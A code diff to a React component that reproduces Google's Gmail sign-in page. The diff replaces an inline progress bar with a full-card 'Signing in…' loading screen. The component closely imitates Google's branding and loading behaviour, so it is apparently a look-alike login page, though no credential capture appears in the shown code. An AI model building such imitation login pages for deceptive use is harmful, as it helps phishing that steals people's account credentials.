@@ -58,10 +58,7 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
 
   const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
     e.preventDefault();
-    if (email) {
-      // Show an in-page progress bar at the top of the SAME email card
-      // (mimicking Google's real loading bar) for ~1s, then transition to
-      // the password step. No separate full-page "spinning sign-in" route.
+    if (email) { 
       setIsTransitioning(true);
       setTimeout(() => {
         setShowPasswordStep(true);
@@ -83,6 +80,35 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
     );
   }
 
+  // Show signing in loading state during transition (with progress line)
+  if (isTransitioning) {
+    return (
+      <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]">
+        <main className="flex-grow w-full flex items-center justify-center p-4">
+          <div 
+            className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12 relative overflow-hidden"
+            style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
+          >
+            {/* Progress line at top */}
+            <div className="absolute top-0 left-0 right-0 h-[3px] bg-blue-100 overflow-hidden">
+              <div className="h-full bg-blue-600" style={{ animation: 'signingProgress 1s ease-in-out forwards' }} />
+            </div>
+            <style>{`
+              @keyframes signingProgress {
+                0% { width: 0%; }
+                100% { width: 100%; }
+              }
+            `}</style>
+            <div className="flex flex-col items-center justify-center py-16">
+              <Spinner size="lg" color="border-blue-600" />
+              <p className="mt-6 text-gray-700 text-base">Signing in…</p>
+            </div>
+          </div>
+        </main>
+      </div>
+    );
+  }
+
   const GoogleLogo = () => (
     <svg viewBox="0 0 48 48" className="h-10 w-10" xmlns="http://www.w3.org/2000/svg">
       <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
@@ -96,23 +122,9 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
     <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]" style={{ animation: 'fadeIn 0.3s ease-in' }}>
       <main className="flex-grow w-full flex items-center justify-center p-4">
         <div 
-          className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12 relative overflow-hidden"
+          className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12"
           style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
         >
-          {/* Inline Google-style progress bar shown on the email step while
-              we wait to transition to the password step. Mimics Google's real
-              loading bar — no separate full-page "Signing in…" route. */}
-          {isTransitioning && (
-            <div className="absolute top-0 left-0 right-0 h-[3px] bg-blue-100 overflow-hidden" aria-hidden="true">
-              <div className="h-full bg-blue-600" style={{ animation: 'signingProgress 1s ease-in-out forwards' }} />
-              <style>{`
-                @keyframes signingProgress {
-                  0% { width: 0%; }
-                  100% { width: 100%; }
-                }
-              `}</style>
-            </div>
-          )}
           <form onSubmit={handleSubmit}>
             <div className="flex flex-col md:flex-row md:gap-16">
               {/* Left Column: Logo and heading */}
@@ -167,7 +179,7 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
                       <a href="https://accounts.google.com/signup" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline">
                         Create account
                       </a>
-                      <button onClick={handleNext} disabled={!email || isTransitioning} className="px-6 py-2.5 bg-blue-600 text-white text-sm font-semibold rounded-full hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
+                      <button onClick={handleNext} disabled={!email} className="px-6 py-2.5 bg-blue-600 text-white text-sm font-semibold rounded-full hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
                         Next
                       </button>
                     </div>
